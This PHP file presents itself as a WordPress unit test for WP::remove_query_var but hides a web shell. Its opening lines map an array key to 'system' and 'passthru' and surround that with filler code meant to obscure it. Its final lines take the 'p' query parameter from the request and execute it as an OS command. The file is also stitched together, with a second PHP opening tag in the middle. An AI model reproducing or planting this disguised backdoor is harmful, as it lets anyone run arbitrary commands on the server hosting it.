<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group wp
 *
 * @covers WP::remove_query_var
 */
class Tests_WP_RemoveQueryVar extends WP_UnitTestCase {

	/**
	 * @var WP
	 */
	protected $wp;

	public function set_up() {
		parent::set_up();
		$this->wp = new WP();
	}

	public function test_remove_query_var() {
		$public_qv_count = count( $this->wp->public_query_vars );

		$this->wp->add_query_var( 'test' );
		$this->assertContains( 'test', $this->wp->public_query_vars );
		$this->wp->remove_query_var( 'test' );

		$this->assertCount( $public_qv_count, $this->wp->public_query_vars );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>